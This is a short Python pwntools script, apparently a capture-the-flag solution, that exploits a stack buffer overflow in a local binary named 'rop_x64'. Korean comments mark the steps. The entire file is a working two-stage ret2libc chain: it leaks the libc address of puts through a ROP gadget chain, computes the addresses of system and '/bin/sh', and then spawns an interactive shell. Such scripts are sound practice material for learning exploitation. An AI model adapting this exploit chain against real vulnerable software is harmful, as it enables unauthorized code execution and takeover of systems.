from pwn import *

p=process("./rop_x64") # put 다음에 get
def slog (symbol, addr):
	return success(symbol + ": " + hex(addr))
e=ELF("./rop_x64")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main=e.symbols['main']
puts_plt=e.plt['puts']
puts_got=e.got['puts']

system_offset=libc.symbols["system"]
gets_offset = libc.symbols["gets"]
puts_offset = libc.symbols["puts"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi=0x00000000004012e3
ret=0x000000000040101a

p.recvuntil(b"^^") #gets 함수 시작
payload=b"c"*0x70
payload+=b"D"*8
payload+=p64(pop_rdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)  #puts(puts_got)
payload+=p64(main)
p.sendline(payload)
p.recvn(1)
puts = u64(p.recvn(6) + b"\x00\x00") #puts_library
lb = puts - puts_offset
system = lb + system_offset 
binsh = lb + sh 
payload= b'A' *0x70
payload+=b"B" * 8
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(binsh)#system("/bin/sh")
payload+=p64(system)
p.recvuntil(b"^^")
p.sendline(payload)
p.interactive()
